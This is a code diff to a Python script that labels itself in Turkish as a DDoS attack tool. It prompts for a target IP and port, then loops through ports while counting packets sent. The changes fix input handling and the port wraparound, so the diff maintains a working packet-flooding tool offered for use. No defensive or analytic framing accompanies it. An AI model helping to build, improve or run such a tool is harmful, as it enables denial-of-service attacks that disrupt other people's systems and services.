@@ -22,7 +22,7 @@ os.system("clear")
 os.system("figlet DDos Saldiri Araci")
 print 
 ip = input("IP Hedefi : ")
-port = input("Port numarasını girin: ")
+port = int(input("Port numarasını girin: "))
 
 os.system("clear")
 os.system("figlet F4KOR4LL DDOS ATTACK TOOL")
@@ -42,5 +42,5 @@ while True:
   gönderilen = gönderilen + 1
   port = int(port) + 1
   print("%s IP adresine ve %s nolu porta %s paket gönderildi.")%(ip,port,gönderilen)
-  if port == 65534:
-       port = 1
+  if port == 65535:
+    port = 1
